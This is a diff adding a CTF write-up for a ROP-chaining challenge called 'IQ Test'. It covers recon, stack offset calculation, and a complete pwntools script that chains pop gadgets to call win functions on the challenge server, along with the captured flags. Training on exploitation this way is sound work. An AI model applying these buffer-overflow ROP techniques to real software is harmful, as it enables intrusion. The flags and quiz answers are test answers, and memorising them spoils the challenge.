@@ -225,7 +225,197 @@ pop rdi;ret
 ## Resources:
 Suraj my goated mentor ^^
 
+# 3. IQ Test
 
+---
+
+##  Challenge Description
+
+> ROP chaining
+
+---
+
+##  Files Provided
+
+- `Chall` – ELF 64-bit binary
+
+
+```bash
+=========== Welcome to the Exploitation Dojo ==============
+You must first prove your knowledge if you want access to my secrets
+Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left-to-right. True or False?
+[1] True
+[2] False
+> 2
+Correct!
+Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?
+[1] RDI
+[2] RSI
+[3] RAX
+[4] RCX
+> 1
+Correct!
+Question 3: In an x86-64 Linux architecture, where is the return value of a function typically stored?
+[1] RDX
+[2] RSP
+[3] RBP
+[4] RAX
+> 4
+Correct!
+You may have passed my test but I must see you display your knowledge before you can access my secrets
+Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
+
+```
+## Initial Recon
+> 1.Running the elf file and analysing the output <br>
+> 2. File prompts user to enter inputs <br>
+> 3. Starts with a quiz which is answered easily by yours truly <Br>
+> 4. After passing the quiz the details of first step of the challenge are passed to us <br>
+> 5. we must simply jump to the win() function, analyzing in binary takes no argument <br>
+
+## Vulnerability analsyis
+> 1. Opening the file in IDA<br>
+> 2. analyzing win1() in IDA<Br>
+<img width="1139" height="645" alt="image" src="https://github.com/user-attachments/assets/1fec8d1c-f291-422c-9c40-8522de9fcc8f" />
+ <Br>
+> 3. Plain old buffer overflow it is. Or is it?
+
+
+## Exploit strat
+> 1. Finding the padding/offset via De brujn's sequence or eyeballing <br>
+> 2. packing the address of win1() func to maintain endian-ness<Br>
+> 3. Using rop gadget to align the stack and see what happens <br>
+
+
+## Next steps
+```bash
+You have passed the first challenge. The next one won't be so simple.
+Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. <Br>
+Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?} <Br>
+```
+>  Analyzing win2() in IDA<BR>
+<img width="436" height="136" alt="image" src="https://github.com/user-attachments/assets/b4ea5ee5-a7eb-463b-bac2-3f671db00fe4" />
+<br>
+>  Calculating offset by viewing the the RBP val. <Br>
+> offset: 0x20 + 0x08 = 0x28 = 40bytes <Br>
+- Crafting the required payload then sending it again to the terminal
+   > Since win2() takes 2 arguments we must set RDI and RSI accordingly <Br>
+   
+```bash
+Continue:
+You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE].<Br>
+ You must venture out and find the temple yourself. I believe in you
+nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)
+```
+- Win3()
+  ><img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/c1aa8b83-ccf5-4fba-aeb2-b20bb6e247b3" />
+<br>
+ > Again via RBP calculating offset for win2() : 0x30 + 0x08 = 0x38 = 56 bytes
+   > Win3() function needs 3 arguments so we need to pop the respective values inside RDI RSI AND RDX and then make an ROP chain again and send to function <br>
+  >This gives us our flag.
+   
+### Note:
+- The rop.find_gadget command in PWNTOOLS library makes it easier to locate gadgets otherwise we would have to chain in the addresses of the gadgets manually   
+### Exploit script
+Chaining everything together we get the following script<BR>
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+MODE = "remote"
+# MODE = "local"
+
+if MODE == "local":
+    p = process("./chall")
+else:
+    p = remote("iqtest.nitephase.live", 51823)
+    # for testing remote on your own server:
+    # p = remote("localhost", 6161)
+
+elf = ELF("./chall")
+
+# -------------------------
+# menu answers
+# -------------------------
+p.sendlineafter(b'>', b'2')
+p.sendlineafter(b'>', b'1')
+p.sendlineafter(b'>', b'4')
+
+# -------------------------
+# gadgets
+# -------------------------
+rop = ROP(elf)
+ret_gadget = rop.find_gadget(['ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
+
+# -------------------------
+# FIRST PAYLOAD → win1()
+# -------------------------
+offset1 = 152
+win1_addr = elf.symbols["win1"]
+
+payload1 = flat(
+    b"A" * offset1,
+    p64(ret_gadget),
+    p64(win1_addr)
+)
+p.sendline(payload1)
+
+# -------------------------
+# SECOND PAYLOAD → win2(0xDEADBEEF)
+# -------------------------
+offset2 = 40
+arg2 = 0xDEADBEEF
+win2_addr = 0x401314
+
+payload2 = flat(
+    b"A" * offset2,
+    p64(pop_rdi),
+    p64(arg2),
+    p64(ret_gadget),
+    p64(win2_addr)
+)
+p.sendline(payload2)
+
+# -------------------------
+# THIRD PAYLOAD → win3(a1, a2, a3)
+# -------------------------
+offset3 = 56
+arg1 = 0xDEADBEEF
+arg2 = 0xDEAFFACE
+arg3 = 0xFEEDCAFE
+win3_addr = 0x4011E6
+
+payload3 = flat(
+    b"A" * offset3,
+    p64(pop_rdi),
+    p64(arg1),
+    p64(ret_gadget),
+    p64(pop_rsi),
+    p64(arg2),
+    p64(ret_gadget),
+    p64(pop_rdx),
+    p64(arg3),
+    p64(ret_gadget),
+    p64(win3_addr)
+)
+p.sendline(payload3)
+
+p.interactive()
+
+```
+
+```
+# flag nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
+
+```
+## Resources:
+.
 
 
 
